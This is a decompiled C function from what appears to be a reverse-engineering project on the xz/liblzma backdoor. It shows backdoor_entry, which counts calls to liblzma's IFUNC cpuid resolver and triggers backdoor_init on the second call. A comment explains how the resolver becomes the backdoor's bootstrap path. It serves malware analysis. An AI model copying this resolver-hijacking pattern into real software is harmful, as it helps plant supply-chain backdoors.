// /home/kali/xzre-ghidra/xzregh/10A720_backdoor_entry.c
// Function: backdoor_entry @ 0x10A720
// Calling convention: __stdcall
// Prototype: uint __stdcall backdoor_entry(uint cpuid_request, u64 * caller_frame)
/*
 * AutoDoc: Executes inside liblzma's IFUNC resolver, counting invocations and calling `backdoor_init` on the second pass. This turns the seemingly harmless cpuid resolver into the backdoor's bootstrap path.
 */

#include "xzre_types.h"


uint backdoor_entry(uint cpuid_request,u64 *caller_frame)

{
  u32 a;
  u32 b;
  u32 c;
  elf_entry_ctx_t state;
  
  if (resolver_call_count == 1) {
    state.symbol_ptr = (void *)0x1;
    state.got_ctx.got_ptr = (void *)0x0;
    state.got_ctx.return_address = (void *)0x0;
    state.got_ctx.cpuid_fn = (void *)0x0;
    state.got_ctx.got_offset = 0;
    state.frame_address = caller_frame;
    backdoor_init(&state,caller_frame);
  }
  resolver_call_count = resolver_call_count + 1;
  _cpuid_gcc(cpuid_request,&a,&b,&c,(uint *)&state);
  return a;
}

